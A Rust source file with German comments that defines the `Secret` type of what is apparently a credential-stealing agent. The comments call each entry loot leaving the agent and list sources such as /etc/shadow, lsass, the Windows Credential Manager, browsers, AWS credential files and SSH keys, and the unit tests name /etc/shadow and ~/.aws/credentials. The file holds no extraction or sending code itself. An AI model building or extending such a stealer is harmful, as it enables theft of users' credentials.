//! Das extrahierte Secret — die Form, in der ein Beutestück den Agenten verlässt.
//!
//! Windows und POSIX liefern dieselbe Form: der Extraktor erzeugt sie, der
//! Agent reicht sie weiter. Zwei getrennte Typen mit denselben Feldern haben
//! im Agent vier kopierte Blöcke erzwungen — und die Information „woher kommt
//! das" lag in zwei Modulen.
//!
//! `source` wandert deshalb in den Extraktor: der Extraktor weiß, ob ein
//! Stück aus `/etc/shadow`, aus dem Credential Manager oder aus dem Browser
//! stammt. Der Agent muss das nicht mehr raten.

/// Ein extrahiertes Secret.
///
/// Der Wert steht hier im Klartext — der Agent versiegelt ihn, bevor er das
/// Stück weitergibt. Das Versiegeln gehört nicht in diesen Typ: der Typ
/// beschreibt ein Beutestück, nicht seinen Transport.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct Secret {
    /// Die Art des Geheimnisses (`shadow`, `lsass`, `aws`, `ssh_key`, ...).
    pub secret_type: String,
    /// Das Ziel: Benutzername, Pfad oder Schlüssel-Kennung.
    pub target: String,
    /// Der Wert im Klartext.
    pub value: String,
    /// Woher das Stück stammt — der Pfad oder das Werkzeug, aus dem es kam.
    ///
    /// `default`, weil die PowerShell-Ausgabe des Credential Managers keine
    /// Quelle mitliefert — der Extraktor setzt sie danach.
    #[serde(default)]
    pub source: String,
}

impl Secret {
    /// Erzeugt ein Secret.
    pub fn new(
        secret_type: impl Into<String>,
        target: impl Into<String>,
        value: impl Into<String>,
        source: impl Into<String>,
    ) -> Self {
        Secret {
            secret_type: secret_type.into(),
            target: target.into(),
            value: value.into(),
            source: source.into(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ein_secret_traegt_alle_vier_angaben() {
        let s = Secret::new("shadow", "root", "hash-wert", "/etc/shadow");
        assert_eq!(s.secret_type, "shadow");
        assert_eq!(s.target, "root");
        assert_eq!(s.value, "hash-wert");
        assert_eq!(s.source, "/etc/shadow");
    }

    #[test]
    fn zwei_secrets_derselben_quelle_sind_gleich() {
        let a = Secret::new("aws", "user", "wert", "~/.aws/credentials");
        let b = Secret::new("aws", "user", "wert", "~/.aws/credentials");
        assert_eq!(a, b);
    }
}
